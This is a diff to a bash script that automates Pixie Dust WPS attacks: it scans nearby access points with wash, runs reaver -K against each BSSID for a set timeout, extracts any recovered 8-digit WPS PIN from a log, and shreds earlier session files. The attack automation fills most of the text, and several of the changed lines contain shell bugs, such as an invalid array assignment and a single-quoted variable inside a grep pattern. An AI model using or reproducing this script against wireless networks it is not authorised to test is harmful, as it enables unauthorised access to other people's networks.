@@ -10,7 +10,7 @@ blue="\e[0;94m"
 esc="\e[0m"
 uline="\e[4m"
 
-if [ -z "$1" ] || [ -z "$2" ]; then
+if [ ! $1 ] || [ ! $2 ]; then
 	echo " Usage: $0 <interface> <timeout> -r(exclusively ralink chipsets)"
 	exit
 fi
@@ -20,15 +20,15 @@ if [ $(whoami) != "root" ]; then
 	exit
 fi
 
-if [ -z $(which wash) ] || [ -z $(which reaver) ]; then
+if [ ! "$(which wash)" ] || [ ! "$(which reaver)" ]; then
 	echo "[!] 'reaver' is not installed. Exiting.."
 	exit
 fi
 
 if [ "$3" == "-r" ]; then
-	ra=true
+	ra="true"
 elif [ "$3" != "-r" ]; then
-	ra=false
+	ra="false"
 fi
 
 cleanup() {
@@ -71,21 +71,37 @@ vendor=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 6))
 essid=($(cat wash.txt | tr -s ' ' | cut -d ' ' -f 7))
 
 rm -f wash.txt
-shred -u /usr/local/var/lib/reaver/*.wpc
-#trap - SIGINT
 
-for ((x = 0; x < ${#bssid[@]}; x++)); do
+if [ "$(ls /var/lib/reaver | grep *.wpc)" ]; then
+	shred -u /var/lib/reaver/*.wpc
+fi
+
+if [ -f "diamond.log" ]; then
+	shred -u diamond.log
+fi
+
+for ((x = 0; x < ${#bssid[*]}; x++)); do
+
+	if [ ! "${vendor[x]}" ]; then
+		${vendor[x]}="Unknown"
+	fi
+
 	echo -e "[+] ${red}Checking for Pixie WPS Vulnerability..${esc}"
 	echo -e "[+] ${blue}ESSID:${esc} ${green}${essid[x]}${esc} ${blue}BSSID:${esc} ${green}${bssid[x]}${esc} ${blue}Signal:${esc} ${green}${signal[x]}${esc}" 
 	echo -e "[+] ${blue}Vendor:${esc} ${green}${vendor[x]}${esc} ${blue}Channel:${esc} ${green}${channel[x]}${esc} ${blue}WPS Version:${esc} ${green}${wpsver[x]}${esc} ${blue}WPS Lock:${esc} ${green}${wpslock[x]}${esc}"
-	echo "ESSID: ${bssid[x]} Channel: ${channel[x]} Vendor: ${vendor[x]}" >> diamond.log 
+	echo "ESSID: ${essid[x]} BSSID: ${bssid[x]} Channel: ${channel[x]} Vendor: ${vendor[x]}" >> diamond.log 
 	reaver -i $1 -b ${bssid[x]} -K -q 2>&1 >> diamond.log &
 	echo -e "[+] Trying for ${red}$timeout${esc} seconds.."
-	tail -f diamond.log | grep 'WPS PIN' -A 2 &
-	tail -f diamond.log | grep 'WPS pin:' &
+	tail -f diamond.log | grep '${bssid[x]}' -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}' &
 	sleep $timeout
 	pkill tail
 	pkill reaver
+
+	if [ ! "$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}')" ]; then
+		echo -e "[!] ${red}Access point not vulnerable.${esc}\n"
+	elif [ "$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -E '[0-9]{8}')" ]; then
+		echo -e "[!] ${green}Access point vulnerable.${esc} ${red}WPS PIN:${esc} ${uline}$(cat diamond.log | grep ${bssid[x]} -A 12 | grep 'WPS pin:' | grep -Eo '[0-9]{8}')${esc}\n"
+	fi
 done
 
 echo -e "[+] ${blue}${uline}$0${esc} has finished. Check '${green}${uline}diamond.log${esc}' for details."
